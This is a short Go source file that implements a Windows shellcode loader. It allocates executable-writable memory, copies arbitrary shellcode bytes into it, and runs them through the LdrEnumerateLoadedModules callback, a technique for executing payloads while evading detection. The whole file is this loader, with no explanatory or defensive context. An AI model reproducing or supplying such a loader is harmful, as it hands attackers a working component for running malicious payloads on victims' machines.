package TT

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	ntdll            = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	GetModuleHandleW = kernel32.MustFindProc("GetModuleHandleW")
	GetProcAddress   = kernel32.MustFindProc("GetProcAddress")
	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	p1, _ := syscall.UTF16PtrFromString("ntdll")
	hNtdll, _, _ := GetModuleHandleW.Call(uintptr(unsafe.Pointer(p1)))

	p2, _ := syscall.UTF16PtrFromString("LdrEnumerateLoadedModules")
	func1, _, _ := GetProcAddress.Call(hNtdll, uintptr(unsafe.Pointer(p2)))

	func2 := (*func(ReservedFlag uintptr, EnumProc uintptr, context uintptr))(unsafe.Pointer(func1))
	LdrEnumerateLoadedModules := *func2
	LdrEnumerateLoadedModules(NULL, addr, NULL)
}

